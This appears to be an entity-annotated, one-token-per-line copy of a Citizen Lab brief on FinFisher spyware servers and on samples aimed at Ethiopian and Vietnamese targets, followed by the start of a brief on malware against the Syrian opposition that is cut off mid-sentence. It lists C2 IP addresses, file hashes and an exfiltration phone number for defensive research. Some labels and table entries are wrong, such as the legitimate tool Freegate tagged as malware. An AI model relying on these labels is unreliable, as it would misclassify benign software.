The
Citizen
Lab

Research
Brief
Number
15
–
March
2013

You
Only
Click
Twice
:
finfisher's  B_malware.backdoor
Global
Proliferation

Morgan
Marquis-Boire
,
Bill
Marczak
,
Claudio
Guarnieri
,
and
John
Scott-Railton
.

This
post
describes
the
results
of
a
comprehensive
global
Internet
scan
for
the
command
and
control
servers
of
finfisher's  B_malware.backdoor
surveillance  I
software  I
.

It
also
details
the
discovery
of
a
campaign
using
finfisher  B_malware.backdoor
in
Ethiopia
used
to
target
individuals
linked
to
an
opposition
group
.

Additionally
,
it
provides
examination
of
a
FinSpy  B_malware.backdoor
Mobile  I
sample
found
in
the
wild
,
which
appears
to
have
been
used
in
Vietnam
.

1
.
SUMMARY
OF
KEY
FINDINGS

We
have
found
command
and
control
servers
for
FinSpy  B_malware.backdoor
backdoors I
,
part
of
Gamma
International's
finfisher  B_malware.backdoor
'
remote
monitoring
solution
,
'
in
a
total
of
25
countries
:
Australia
,
Bahrain
,
Bangladesh
,
Brunei
,
Canada
,
Czech
Republic
,
Estonia
,
Ethiopia
,
Germany
,
India
,
Indonesia
,
Japan
,
Latvia
,
Malaysia
,
Mexico
,
Mongolia
,
Netherlands
,
Qatar
,
Serbia
,
Singapore
,
Turkmenistan
,
United
Arab
Emirates
,
United
Kingdom
,
United
States
,
Vietnam
.


A
FinSpy  B_malware.backdoor
campaign
in
Ethiopia
uses
pictures
of
Ginbot
7
,
an
Ethiopian
opposition
group
,
as
bait
to
infect
users
.

This
continues
the
theme
of
FinSpy  B_malware.backdoor
deployments
with
strong
indications
of
politicallymotivated
targeting
.


There
is
strong
evidence
of
a
Vietnamese
FinSpy  B_malware.backdoor
Mobile
Campaign
.

We
found
an
Android B_malware.infosteal
FinSpy  I
Mobile  I
sample  I
in
the
wild
with
a
command
&
control
server
in
Vietnam
that
also
exfiltrates
text
messages
to
a
local
phone
number
.


These
findings
call
into
question
claims
by
Gamma
International
that
previously
reported
servers
were
not
part
of
their
product
line
,
and
that
previously
discovered
copies
of
their
software
were
either
stolen
or
demo
copies
.

Number
15
–
March
2013
2
.
BACKGROUND
AND
INTRODUCTION
finfisher  B_malware.backdoor
is
a
line
of
remote
intrusion
and
surveillance
software
developed
by
Munich-based
Gamma
International
GmbH
.

finfisher  B_malware.backdoor
products
are
marketed
and
sold
exclusively
to
law
enforcement
and
intelligence
agencies
by
the
UK-based
Gamma
Group
.
1

Although
touted
as
a
'
lawful
interception
'
suite
for
monitoring
criminals
,
finfisher  B_malware.backdoor
has
gained
notoriety
because
it
has
been
used
in
targeted
attacks
against
human
rights
campaigners
and
opposition
activists
in
countries
with
questionable
human
rights
records
.
2

In
late
July
2012
,
we
published
the
results
of
an
investigation
into
a
suspicious
e-mail
campaign
targeting
Bahraini
activists
.
3

We
analyzed
the
attachments
and
discovered
that
they
contained
the
FinSpy  B_malware.infosteal
spyware I
,
finfisher's  B_malware.backdoor
remote  I
monitoring  I
product I
.

FinSpy  B_malware.infosteal
captures
information
from
an
infected
computer
,
such
as
passwords
and
Skype
calls
,
and
sends
the
information
to
a
FinSpy  B_malware.backdoor
command I
& I
control I
(
C2
)
server
.

The
attachments
we
analyzed
sent
data
to
a
command
&
control
server
inside
Bahrain
.

This
discovery
motivated
researchers
to
search
for
other
command
&
control
servers
to
understand
how
widely
finfisher  B_malware.backdoor
might
be
used
.

Claudio
Guarnieri
at
Rapid7
(
one
of
the
authors
of
this
report
)
was
the
first
to
search
for
these
servers
.

He
fingerprinted
the
Bahrain
server
and
looked
at
historical
Internet
scanning
data
to
identify
other
servers
around
the
world
that
responded
to
the
same
fingerprint
.

Rapid7
published
this
list
of
servers
,
and
described
their
fingerprinting
technique
.

Other
groups
,
including
CrowdStrike
and
SpiderLabs
also
analyzed
and
published
reports
on
FinSpy  B_malware.backdoor
.

Immediately
after
publication
,
the
servers
were
apparently
updated
to
evade
detection
by
the
Rapid7
fingerprint
.

We
devised
a
different
fingerprinting
technique
and
scanned
portions
of
the
internet
.

We
confirmed
Rapid7's
results
,
and
also
found
several
new
servers
,
including
one
inside
Turkmenistan's
Ministry
of
Communications
.

We
published
our
list
of
servers
in
late
August
2012
,
in
addition
to
an
analysis
of
mobile
phone
versions
of
FinSpy  B_malware.backdoor
.

FinSpy  B_malware.backdoor
servers
were
apparently
updated
again
in
October
2012
to
disable
this
newer
fingerprinting
technique
,
although
it
was
never
publicly
described
.

Nevertheless
,
via
analysis
of
existing
samples
and
observation
of
command
&
control
servers
,
we
managed
to
enumerate
yet
more
fingerprinting
methods
and
continue
our
survey
of
the
internet
for
this
surveillance
software
.

We
describe
the
results
in
this
post
.

Civil
society
groups
have
found
cause
for
concern
in
these
findings
,
as
they
indicate
the
use
of
finfisher  B_malware.backdoor
products
by
countries
like
Turkmenistan
and
Bahrain
with
problematic
records
on
human
rights
,
transparency
,
and
rule
of
law
.

In
an
August
2012
response
to
a
letter
from
UK-based
NGO
Privacy
International
,
the
UK
Government
revealed
that
at
some
unspecified
time
in
the
past
,
it
had
examined
a
version
of
FinSpy  B_malware.backdoor
,
and
communicated
to
Gamma
that
a
license
would
be
required
to
export
that
version
outside
of
the
EU
.

Gamma
has
repeatedly
denied
links
to
spyware
and
servers
uncovered
by
our
research
,
claiming
that
the
servers
detected
by
our
scans
are
'
not
...
from
the
finfisher  B_malware.backdoor
product
line
.
'
4

Gamma
also
claims
that
the
spyware
sent
to
activists
in
Bahrain
was
an
'
old
'
demonstration
version
of
FinSpy  B_malware.backdoor
,
stolen
during
a
product
presentation
.

In
February
2013
,
Privacy
International
,
the
European
Centre
for
Constitutional
and
Human
Rights
(
ECCHR
)
,
the
Bahrain
Center
for
Human
Rights
,
Bahrain
Watch
,
and
Reporters
Without
Borders
filed
a
complaint
with
the
Organization
for
Economic
Cooperation
and
Development
(
OECD
)
,
requesting
that
this
body
investigate
whether
Gamma
violated
OECD
Guidelines
for
Multinational
Enterprises
by
exporting
FinSpy  B_malware.backdoor
to
Bahrain
.

Number
15
–
March
2013
The
complaint
called
previous
Gamma
statements
into
question
,
noting
that
at
least
two
different
versions
(
4.00
and
4.01
)
of
FinSpy  B_malware.backdoor
were
found
in
Bahrain
,
and
that
Bahrain's
server
was
a
finfisher  B_malware.backdoor
product
and
was
likely
receiving
updates
from
Gamma
.

This
complaint
,
as
laid
out
by
Privacy
International
states
that
Gamma
:

failed
to
respect
the
internationally
recognised
human
rights
of
those
affected
by
[
its
]
activities

caused
and
contributed
to
adverse
human
rights
impacts
in
the
course
of
[
its
]
business
activities

failed
to
prevent
and
mitigate
adverse
human
rights
impacts
linked
to
[
its
]
activities
and
products
,
and
failed
to
address
such
impacts
where
they
have
occurred

failed
to
carry
out
adequate
due
diligence
(
including
human
rights
due
diligence
)
;
and

failed
to
implement
a
policy
commitment
to
respect
human
rights
.

According
to
recent
reporting
,
German
Federal
Police
appear
to
have
plans
to
purchase
and
use
the
finfisher  B_malware.backdoor
suite
of
tools
domestically
within
Germany
.
5

Meanwhile
,
findings
by
our
group
and
others
continue
to
illustrate
the
global
proliferation
of
finfisher's  B_malware.backdoor
products
.

Research
continues
to
uncover
troubling
cases
of
FinSpy  B_malware.backdoor
in
countries
with
dismal
human
rights
track
records
,
and
politically
repressive
regimes
.

Most
recently
,
work
by
Bahrain
Watch
has
confirmed
the
presence
of
a
Bahraini
finfisher  B_malware.backdoor
campaign
,
and
further
contradicted
Gamma's
public
statements
.

This
post
adds
to
the
list
by
providing
an
updated
list
of
FinSpy  B_malware.backdoor
Command I
& I
Control I
servers I
,
and
describing
the
FinSpy  B_malware.backdoor
malware I
samples I
in
the
wild
which
appear
to
have
been
used
to
target
victims
in
Ethiopia
and
Vietnam
.

We
present
these
updated
findings
in
the
hopes
that
we
will
further
encourage
civil
society
groups
and
competent
investigative
bodies
to
continue
their
scrutiny
of
Gamma's
activities
,
relevant
export
control
issues
,
and
the
issue
of
the
global
and
unregulated
proliferation
of
surveillance
malware
.

finfisher  B_malware.backdoor
:
UPDATED
GLOBAL
SCAN
Number
15
–
March
2013

Figure
1
.
Map
of
global
finfisher  B_malware.backdoor
proliferation

Around
October
2012
,
we
observed
that
the
behavior
of
FinSpy  B_malware.backdoor
servers
began
to
change
.

Servers
stopped
responding
to
our
fingerprint
,
which
had
exploited
a
quirk
in
the
distinctive
FinSpy  B_malware.backdoor
wire  I
protocol  I
.

We
believe
that
this
indicates
that
Gamma
either
independently
changed
the
FinSpy  B_malware.backdoor
protocol  I
,
or
was
able
to
determine
key
elements
of
our
fingerprint
,
although
it
has
never
been
publicly
revealed
.

In
the
wake
of
this
apparent
update
to
FinSpy  B_malware.backdoor
command I
& I
control I
servers I
,
we
devised
a
new
fingerprint
and
conducted
a
scan
of
the
internet
for
FinSpy  B_malware.backdoor
command I
& I
control I
servers I
.

This
scan
took
roughly
two
months
and
involved
sending
more
than
12
billion
packets
.

Our
new
scan
identified
a
total
of
36
FinSpy  B_malware.backdoor
servers I
,
30
of
which
were
new
and
6
of
which
we
had
found
during
previous
scanning
.

The
servers
operated
in
19
different
countries
.

Among
the
FinSpy  B_malware.backdoor
servers I
we
found
,
7
were
in
countries
we
hadn't
seen
before
.

New
Countries
Canada
,
Bangladesh
,
India
,
Malaysia
,
Mexico
,
Serbia
,
Vietnam

Number
15
–
March
2013
In
our
most
recent
scan
,
16
servers
that
we
had
previously
found
did
not
show
up
.

We
suspect
that
after
our
earlier
scans
were
published
the
operators
moved
them
.

Many
of
these
servers
were
shut
down
or
relocated
after
the
publication
of
previous
results
,
but
before
the
apparent
October
2012
update
.

We
no
longer
found
FinSpy  B_malware.backdoor
servers I
in
4
countries
where
previous
scanning
identified
them
(
Brunei
,
UAE
,
Latvia
,
and
Mongolia
)
.

Taken
together
,
FinSpy  B_malware.backdoor
servers I
are
currently
,
or
have
been
present
,
in
25
countries
.

Australia
,
Bahrain
,
Bangladesh
,
Brunei
,
Canada
,
Czech
Republic
,
Estonia
,
Ethiopia
,
Germany
,
India
,
Indonesia
,
Japan
,
Latvia
,
Malaysia
,
Mexico
,
Mongolia
,
Netherlands
,
Qatar
,
Serbia
,
Singapore
,
Turkmenistan
,
United
Arab
Emirates
,
United
Kingdom
,
United
States
,
Vietnam
.

Importantly
,
we
believe
that
our
list
of
servers
is
incomplete
due
to
the
large
diversity
of
ports
used
by
FinSpy  B_malware.backdoor
servers I
,
as
well
as
other
efforts
at
concealment
.

Moreover
,
discovery
of
a
FinSpy  B_malware.backdoor
command I
and I
control I
server  I
in
a
given
country
is
not
a
sufficient
indicator
to
conclude
the
use
of
finfisher  B_malware.backdoor
by
that
country's
law
enforcement
or
intelligence
agencies
.

In
some
cases
,
servers
were
found
running
on
facilities
provided
by
commercial
hosting
providers
that
could
have
been
purchased
by
actors
from
any
country
.

The
table
below
shows
the
FinSpy  B_malware.backdoor
servers I
detected
in
our
latest
scan
.

We
list
the
full
IP
address
of
servers
that
have
been
previously
publicly
revealed
.

For
active
servers
that
have
not
been
publicly
revealed
,
we
list
the
first
two
octets
only
.

Releasing
complete
IP
addresses
in
the
past
has
not
proved
useful
,
as
the
servers
are
quickly
shut
down
and
relocated
.

IP
Operator
Routed
to
Country
117.121.xxx.xxx B_ip.cncsvr
GPLHost
Australia
77.69.181.162 B_ip.cncsvr
Batelco
ADSL
Service
Bahrain
180.211.xxx.xxx B_ip.cncsvr
Telegraph
&
Telephone
Board
Bangladesh
168.144.xxx.xxx B_ip.cncsvr
Softcom
,
Inc
.
Canada
168.144.xxx.xxx B_ip.cncsvr
Softcom
,
Inc
.
Canada
217.16.xxx.xxx  B_ip.cncsvr
PIPNI
VPS
Czech
Republic
217.146.xxx.xxx B_ip.cncsvr
Zone
Media
UVS
/
Nodes
Estonia
213.55.99.74  B_ip.cncsvr
Ethio
Telecom
Estonia
80.156.xxx.xxx  B_ip.cncsvr
Gamma
International
GmbH
Germany
37.200.xxx.xxx  B_ip.cncsvr
JiffyBox
Servers
Germany

Number
15
–
March
2013
178.77.xxx.xxx  B_ip.cncsvr
HostEurope
GmbH
Germany
119.18.xxx.xxx  B_ip.cncsvr
HostGator
India
119.18.xxx.xxx  B_ip.cncsvr
HostGator
India
118.97.xxx.xxx  B_ip.cncsvr
PT
Telkom
Indonesia
118.97.xxx.xxx  B_ip.cncsvr
PT
Telkom
Indonesia
103.28.xxx.xxx  B_ip.cncsvr
PT
Matrixnet
Global
Indonesia
112.78.143.34 B_ip.cncsvr
Biznet
ISP
Indonesia
112.78.143.26 B_ip.cncsvr
Biznet
ISP
Indonesia
117.121.xxx.xxx B_ip.cncsvr
GPLHost
Malaysia
187.188.xxx.xxx B_ip.cncsvr
Iusacell
PCS
Mexico
201.122.xxx.xxx B_ip.cncsvr
UniNet
Mexico
164.138.xxx.xxx B_ip.cncsvr
Tilaa
Netherlands
164.138.28.2  B_ip.cncsvr
Tilaa
Netherlands
78.100.57.165 B_ip.cncsvr
Qtel
–
Government
Relations
Qatar
195.178.xxx.xxx B_ip.cncsvr
Tri.d.o.o
/
Telekom
Srbija
Serbia
117.121.xxx.xxx B_ip.cncsvr
GPLHost
Singapore
217.174.229.82  B_ip.cncsvr
Ministry
of
Communications
Turkmenistan
72.22.xxx.xxx B_ip.cncsvr
iPower
,
Inc
.
United
States
166.143.xxx.xxx B_ip.cncsvr
Verizon
Wireless
United
States
117.121.xxx.xxx B_ip.cncsvr
GPLHost
United
States
117.121.xxx.xxx B_ip.cncsvr
GPLHost
United
States
117.121.xxx.xxx B_ip.cncsvr
GPLHost
United
States
117.121.xxx.xxx B_ip.cncsvr
GPLHost
United
States
183.91.xxx.xxx  B_ip.cncsvr
CMC
Telecom
Infrastructure
Company
Vietnam

Several
of
these
findings
are
especially
noteworthy
:
Number
15
–
March
2013


Eight
servers
are
hosted
by
provider
GPLHost
in
various
countries
(
Singapore
,
Malaysia
,
Australia
,
US
)
.

However
,
we
observed
only
six
of
these
servers
active
at
any
given
time
,
suggesting
that
some
IP
addresses
may
have
changed
during
our
scans
.


A
server
identified
in
Germany
has
the
registrant
'
Gamma
International
GmbH
,
'
and
the
contact
person
is
listed
as
'
Martin
Muench
.
'


There
is
a
FinSpy  B_malware.backdoor
server  I
in
an
IP
range
registered
to
'
Verizon
Wireless
.
'

Verizon
Wireless
sells
ranges
of
IP
addresses
to
corporate
customers
,
so
this
is
not
necessarily
an
indication
that
Verizon
Wireless
itself
is
operating
the
server
,
or
that
Verizon
Wireless
customers
are
being
spied
on
.


A
server
in
Qatar
that
was
previously
detected
by
Rapid7
seems
to
be
back
online
after
being
unresponsive
during
the
last
round
of
our
scanning
.

The
server
is
located
in
a
range
of
16
addresses
registered
to
'
Qtel
–
Corporate
accounts
–
Government
Relations
.
'

The
same
block
of
16
addresses
also
contains
the
website
http://qhotels.gov.qa/
.

3
.
ETHIOPIA
AND
VIETNAM
:
IN-DEPTH
DISCUSSION
OF
NEW
SAMPLES
3.1
FinSpy  B_malware.backdoor
in
Ethiopia
We
analyzed
a
recently
acquired
malware
sample
and
identified
it
as
FinSpy  B_malware.backdoor
.

The
malware B_malware.backdoor
uses
images
of
members
of
the
Ethiopian
opposition
group
,
Ginbot
7
,
as
bait
.

The
malware B_malware.backdoor
communicates
with
a
FinSpy  B_malware.backdoor
Command I
& I
Control I
server  I
in
Ethiopia
,
which
was
first
identified
by
Rapid7
in
August
2012
.

The
server
has
been
detected
in
every
round
of
scanning
,
and
remains
operational
at
the
time
of
this
writing
.

It
can
be
found
in
the
following
address
block
run
by
Ethio
Telecom
,
Ethiopia's
stateowned
telecommunications
provider
:
IP
:
213.55.99.74  B_ip.cncsvr
route
:
213.55.99.0/24
descr
:
Ethio
Telecom
origin
:
AS24757
mnt-by
:
ETC-MNT
member-of
:
rs-ethiotelecom
source
:
RIPE
#
Filtered

The
server
appears
to
be
updated
in
a
manner
consistent
with
other
servers
,
including
servers
in
Bahrain
and
Turkmenistan
.

Number
15
–
March
2013

MD5
8ae2febe04102450fdbc26a38037c82b B_hash
SHA-1
1fd0a268086f8d13c6a3262d41cce13470886b09  B_hash
SHA-256
ff6f0bcdb02a9a1c10da14a0844ed6ec6a68c13c04b4c122afc559d606762fa B_hash

The
sample
is
similar
to
a
previously
analyzed
sample
of
FinSpy  B_malware.backdoor
malware i
sent
to
activists
in
Bahrain
in
2012
.

Just
like
Bahraini
samples
,
the
malware
relocates
itself
and
drops
a
JPG
image
with
the
same
filename
as
the
sample
when
executed
by
an
unsuspecting
user
.

This
appears
to
be
an
attempt
to
trick
the
victim
into
believing
the
opened
file
is
not
malicious
.

Here
are
a
few
key
similarities
between
the
samples
:


The
PE
timestamp
'
2011-07-05
08:25:31
'
of
the
packer
is
exactly
the
same
as
the
Bahraini
sample
.


The
following
string
(
found
in
a
process
infected
with
the
malware
)
,
self-identifies
the
malware
and
is
similar
to
strings
found
in
the
Bahraini
samples
:


The
samples
share
the
same
Bootkit
,
SHA-256
:
ba21e452ee5ff3478f21b293a134b30ebf6b7f4ec03f8c8153202a740d7978b2  B_hash
.


The
samples
share
the
same
driverw.sys
file
,
SHA-256
:
62bde3bac3782d36f9f2e56db097a4672e70463e11971fad5de060b191efb196  B_hash
.

Number
15
–
March
2013
Figure
2
.

The
image
shown
to
the
victim
contains
pictures
of
members
of
the
Ginbot
7
Ethiopian
opposition
group

In
this
case
the
picture
contains
photos
of
members
of
the
Ethiopian
opposition
group
,
Ginbot
7
.

Controversially
,
Ginbot
7
was
designated
a
terrorist
group
by
the
Ethiopian
Government
in
2011
.

The
Committee
to
Protect
Journalists
(
CPJ
)
and
Human
Rights
Watch
have
both
criticized
this
action
,
CPJ
has
pointed
out
that
it
is
having
a
chilling
effect
on
legitimate
political
reporting
about
the
group
and
its
leadership
.

The
existence
of
a
FinSpy  B_malware.backdoor
sample  I
that
contains
Ethiopia-specific
imagery
,
and
that
communicates
with
a
stillactive
command
&
control
server
in
Ethiopia
strongly
suggests
that
the
Ethiopian
Government
is
using
FinSpy  B_malware.backdoor
.

Number
15
–
March
2013
3
.
2
FinSpy  B_malware.backdoor
Mobile
in
Vietnam
We
recently
obtained
and
analyzed
a
malware
sample6
and
identified
it
as
FinSpy  B_malware.backdoor
Mobile
for
Android
.

The
sample
communicates
with
a
command
&
control
server
in
Vietnam
,
and
exfiltrates
text
messages
to
a
Vietnamese
telephone
number
.

The
finfisher  B_malware.backdoor
suite
includes
mobile
phone
versions
of
FinSpy  B_malware.backdoor
for
all
major
platforms
including
iOS
,
Android
,
Windows
Mobile
,
Symbian
and
Blackberry
.

Its
features
are
broadly
similar
to
the
PC
version
of
FinSpy  B_malware.backdoor
identified
in
Bahrain
,
but
it
also
contains
mobile-specific
features
such
as
GPS
tracking
and
functionality
for
silent
'
spy
'
calls
to
snoop
on
conversations
near
the
phone
.

An
in-depth
analysis
of
the
FinSpy  B_malware.backdoor
Mobile
suite
of
backdoors
was
provided
in
an
earlier
blog
post
:
The
Smartphone
Who
Loved
Me
:
finfisher  B_malware.backdoor
Goes
Mobile
?

MD5
573ef0b7ff1dab2c3f785ee46c51a54f  B_hash
SHA-1
d58d4f6ad3235610bafba677b762f3872b0f67cb  B_hash
SHA-256
363172a2f2b228c7b00b614178e4ffa00a3a124200ceef4e6d7edb25a4696345  B_hash

The
sample
included
a
configuration
file7
that
indicates
available
functionality
,
and
the
options
that
have
been
enabled
by
those
deploying
it
:

Figure
3
.
Image
of
a
section
of
a
configuration
file
for
the
FinSpy  B_malware.backdoor
Mobile
sample

Interestingly
,
the
configuration
file
also
specifies
a
Vietnamese
phone
number
used
for
SMS
based
command
and
control
:

Number
15
–
March
2013

Section
Type
:
TlvTypeConfigSMSPhoneNumber
Section
Data
:
'
+841257725403
'

The
command
and
control
server
is
in
a
range
provided
by
the
CMC
Telecom
Infrastructure
Company
in
Hanoi
:

IP
Address
:
183.91.2.199
inetnum
:
183.91.0.0
–
183.91.9.255
netname
:
FTTX-NET
country
:
Vietnam
address
:
CMC
Telecom
Infrastructure
Company
address
:
Tang
3
,
16
Lieu
Giai
str
,
Ba
Dinh
,
Ha
Noi

This
server
was
active
until
very
recently
and
matched
our
signatures
for
a
FinSpy  B_malware.backdoor
command I
and I
control I
server  I
.

Both
the
command
&
control
server
IP
and
the
phone
number
used
for
text-message
exfiltration
are
in
Vietnam
which
indicates
a
domestic
campaign
.

This
apparent
FinSpy  B_malware.backdoor
deployment
in
Vietnam
is
troubling
in
the
context
of
recent
threats
against
online
free
expression
and
activism
.

In
2012
,
Vietnam
introduced
new
censorship
laws
amidst
an
ongoing
harassment
,
intimidation
,
and
detention
campaign
against
of
bloggers
who
spoke
out
against
the
regime
.

This
culminated
in
the
trial
of
17
bloggers
,
14
of
whom
were
recently
convicted
and
sentenced
to
terms
ranging
from
3
to
13
years
.
8

4
.
BRIEF
DISCUSSION
OF
FINDINGS

Companies
selling
surveillance
and
intrusion
software
commonly
claim
that
their
tools
are
only
used
to
track
criminals
and
terrorists
.

finfisher   B_malware.backdoor
,
VUPEN
and
Hacking
Team
have
all
used
similar
language
.
9

Yet
a
growing
body
of
evidence
suggests
that
these
tools
are
regularly
obtained
by
countries
where
dissenting
political
activity
and
speech
is
criminalized
.

Our
findings
highlight
the
increasing
dissonance
between
Gamma's
public
claims
that
FinSpy  B_malware.backdoor
is
used
exclusively
to
track
'
bad
guys
'
and
the
growing
body
of
evidence
suggesting
that
the
tool
has
and
continues
to
be
used
against
opposition
groups
and
human
rights
activists
.

While
our
work
highlights
the
human
rights
ramifications
of
the
mis-use
of
this
technology
,
it
is
clear
that
there
are
broader
concerns
.

A
global
and
unregulated
market
for
offensive
digital
tools
potentially
presents
a

Number
15
–
March
2013

novel
risk
to
both
national
and
corporate
cyber-security
.

On
March
12th
,
US
Director
of
National
Intelligence
James
Clapper
stated
in
his
yearly
congressional
report
on
security
threats
:

'
...
companies
develop
and
sell
professional-quality
technologies
to
support
cyberoperations–often
branding
these
tools
as
lawful-intercept
or
defensive
security
research
products
.

Foreign
governments
already
use
some
of
these
tools
to
target
U.S.
systems
.
'

The
unchecked
global
proliferation
of
products
like
finfisher  B_malware.backdoor
makes
a
strong
case
for
policy
debate
about
surveillance
software
and
the
commercialization
of
offensive
cyber-capabilities
.

Our
latest
findings
give
an
updated
look
at
the
global
proliferation
of
FinSpy  B_malware.backdoor
.

We
identified
36
active
FinSpy  B_malware.backdoor
command I
& I
control I
servers I
,
including
30
previously-unknown
servers
.

Our
list
of
servers
is
likely
incomplete
,
as
some
FinSpy  B_malware.backdoor
servers I
employ
countermeasures
to
prevent
detection
.

Including
servers
discovered
last
year
,
we
now
count
FinSpy  B_malware.backdoor
servers I
in
25
countries
,
including
countries
with
troubling
human
rights
records
.

This
is
indicative
of
a
global
trend
towards
the
acquisition
of
offensive
cyber-capabilities
by
non-democratic
regimes
from
commercial
Western
companies
.

The
Vietnamese
and
Ethiopian
FinSpy  B_malware.backdoor
samples I
we
identified
warrant
further
investigation
,
especially
given
the
poor
human
rights
records
of
these
countries
.

The
fact
that
the
Ethiopian
version
of
FinSpy  B_malware.backdoor
uses
images
of
opposition
members
as
bait
suggests
it
may
be
used
for
politically
influenced
surveillance
activities
,
rather
than
strictly
law
enforcement
purposes
.

The
Ethiopian
sample
is
the
second
FinSpy  B_malware.backdoor
sample  I
we
have
discovered
that
communicates
with
a
server
we
identified
by
scanning
as
a
FinSpy  B_malware.backdoor
command I
& I
control I
server  I
.

This
further
validates
our
scanning
results
,
and
calls
into
question
Gamma's
claim
that
such
servers
are
'
not
...
from
the
finfisher  B_malware.backdoor
product
line
.
'
10

Similarities
between
the
Ethiopian
sample
and
those
used
to
target
Bahraini
activists
also
bring
into
question
Gamma
International's
earlier
claims
that
the
Bahrain
samples
were
stolen
demonstration
copies
.

While
the
sale
of
such
intrusion
and
surveillance
software
is
largely
unregulated
,
the
issue
has
drawn
increased
high-level
scrutiny
.

In
September
of
last
year
,
the
German
foreign
minister
,
Guido
Westerwelle
,
called
for
an
EU-wide
ban
on
the
export
of
such
surveillance
software
to
totalitarian
states
.
11

In
a
December
2012
interview
,
Marietje
Schaake
(
MEP
)
,
currently
the
rapporteur
for
the
first
EU
strategy
on
digital
freedom
in
foreign
policy
,
stated
that
it
was
'
quite
shocking
'
that
Europe
companies
continue
to
export
repressive
technologies
to
countries
where
the
rule
of
law
is
in
question
.
12

We
urge
civil
society
groups
and
journalists
to
follow
up
on
our
findings
within
affected
countries
.

We
also
hope
that
our
findings
will
provide
valuable
information
to
the
ongoing
technology
and
policy
debate
about
surveillance
software
and
the
commercialisation
of
offensive
cyber-capabilities
.

ACKNOWLEDGEMENTS
We'd
like
to
thank
Eva
Galperin
and
the
Electronic
Frontier
Foundation
(
EFF
)
,
Privacy
International
,
Bahrain
Watch
,
and
Drew
Hintz
.

Number
15
–
March
2013

MEDIA
COVERAGE
Media
coverage
of
the
report
includes
HuffingtonPost
Canada
,
Salon
,
The
Verge
,
Bloomberg
Business
Week
,
TheYoungTurks
.

FOOTNOTES
__________________________________
1
https://www.gammagroup.com/
2
Software
Meant
to
Fight
Crime
Is
Used
to
Spy
on
Dissidents
,
http://goo.gl/GDRMe
,
New
York
Times
,
August
31
,
2012
,
Page
A1
Print
edition
.

3
Cyber
Attacks
on
Activists
Traced
to
finfisher  B_malware.backdoor
Spyware
of
Gamma
,
http://goo.gl/nJH7o
,
Bloomberg
,
July
25
,
2012
4
http://bits.blogs.nytimes.com/2012/08/16/company-denies-role-in-recently-uncovered-spyware/
5
http://www.sueddeutsche.de/digital/finfisher-entwickler-gamma-spam-vom-staat-1.1595253
6
This
sample
has
also
been
discussed
by
Denis
Maslennikov
from
Kasperksy
in
his
analyses
of
FinSpy  B_malware.backdoor
Mobile
–
https://www.securelist.com/en/analysis/204792283/Mobile_Malware_Evolution_Part_6
7
Configuration
parsed
with
a
tool
written
by
Josh
Grunzweig
of
Spider
Labs
–
http://blog.spiderlabs.com/2012/09/FinSpy-mobile-configuration-and-insight.html
8
https://www.eff.org/deeplinks/2013/01/bloggers-trial-vietnam-are-part-ongoing-crackdown-free-expression
9
https://www.securityweek.com/podcast-vupen-ceo-chaouki-bekrar-addresses-zero-day-marketplacecontroversy-cansecwest
10
http://bits.blogs.nytimes.com/2012/08/16/company-denies-role-in-recently-uncovered-spyware/
11
http://www.guardian.co.uk/uk/2012/nov/28/offshore-company-directors-military-intelligence
12
http://www.vieuws.eu/foreign-affairs/digital-freedoms-marietje-schaake-mep-alde/
The
Citizen
Lab

Research
Brief

Number
19
–
June
2013

A
Call
to
Harm
:

New
Malware
Attacks
Target
the
Syrian
Opposition

Authors
:
John
Scott-Railton
and
Morgan
Marquis-Boire

SUMMARY
OF
KEY
FINDINGS

Malware
masquerading
as
the
circumvention
tool
Freegate  B_malware.infosteal
.


A
campaign
masquerading
as
a
call
to
arms
by
a
pro-opposition
cleric
.

INTRODUCTION
Syria's
opposition
has
faced
persistent
targeting
by
Pro-Government
Electronic
Actors
(
PGEAs
)
throughout
the
Syrian
civil
war
.

A
pro-government
group
calling
itself
the
Syrian
Electronic
Army
has
gained
visibility
in
recent
months
with
high
profile
attacks
against
news
organizations
.

Meanwhile
,
Syrian
activists
continue
to
be
targeted
with
online
attacks
apparently
for
the
purposes
of
accessing
their
private
communications
and
stealing
their
secrets
.

Throughout
2012
,
attacks
against
the
Syrian
opposition
were
documented
in
an
extensive
series
of
blog
posts
by
Morgan
Marquis-Boire
and
Eva
Galperin
with
the
help
of
the
Electronic
Frontier
Foundation
.
1

Many
others
have
also
contributed
to
research
on
Syrian
malware
,
from
Telecomix
to
a
range
of
security
companies
.

Meanwhile
,
the
Syrian
opposition
,
and
several
groups
working
closely
with
it
,
such
as
Cyber
Arabs
,
have
been
active
in
attempting
to
identify
potential
threats
and
warn
users
.

Researchers
have
identified
a
common
theme
among
the
attacks
against
the
Syrian
opposition
:
sophisticated
social
engineering
that
is
grounded
in
an
awareness
of
the
needs
,
interests
,
and
weaknesses
of
the
opposition
.

Attacks
often
play
on
curiosity
or
ideology
to
encourage
users
to
enter
passwords
or
click
on
enticing
files
,
or
exploit
fears
of
hacking
and
surveillance
with
fake
security
tools
.

Attacks
are
often
transmitted
to
potential
victims
from
the
accounts
of
people
with
whom
they
are
familiar
.

The
two
attacks
that
are
described
in
this
blogpost
follow
this
theme
.

One
is
a
malicious
installer
of
the
circumvention
tool
Freegate  B_malware.infosteal
.

The
other
is
an
e-mail
attachment
calling
for
jihad
against
Hezbollah
and
the
Assad
regime
or
promising
interesting
regional
news
.

Number
18
–
June
2013

ATTACK
1
:
A
HELPING
OF
MALWARE
WITH
THAT
PROXY
?

In
this
attack
,
which
we
first
observed
in
the
second
week
of
June
,
the
potential
victim
is
encouraged
to
visit
a
download
link
containing
a
malicious
installer
of
Freegate  B_malware.infosteal
.

Freegate  B_malware.infosteal
is
a
standalone
circumvention-bypassing
Virtual
Private
Network
(
VPN
)
client
for
Windows
.

Legitimate
versions
of
the
Freegate  B_malware.infosteal
software
are
available
for
download
on
its
website
.

While
initially
developed
for
mainland
Chinese
users
,
the
software
is
used
in
a
number
of
other
countries
.

While
Freegate  B_malware.infosteal
was
erroneously
labelled
a
Trojan  B_malware.backdoor
by
one
anti-virus
company
nearly
a
decade
ago
,
in
this
attack
,
attackers
packaged
what
appears
to
be
a
legitimate
version
of
Freegate  B_malware.infosteal
with
a
malicious
implant
.
2

The
targeted
group
were
members
of
the
Syrian
opposition
in
a
private
social
media
group
.

http://www.mediafire.com/download/[REDACTED]/VPN-Pro.zip

When
a
potential
victim
visits
the
link
,
they
are
offered
the
download
of
a
file
which
MediaFire
lists
as
uploaded
on
June
15
,
2013
.

VPN-PRO.zip
3
Uploaded
:
2013-06-15
16:54:31

The
zip
file
extracts
to
a
MS
Windows
executable
file
.

VPN-Pro.exe B_malware.drop
4

The
binary
was
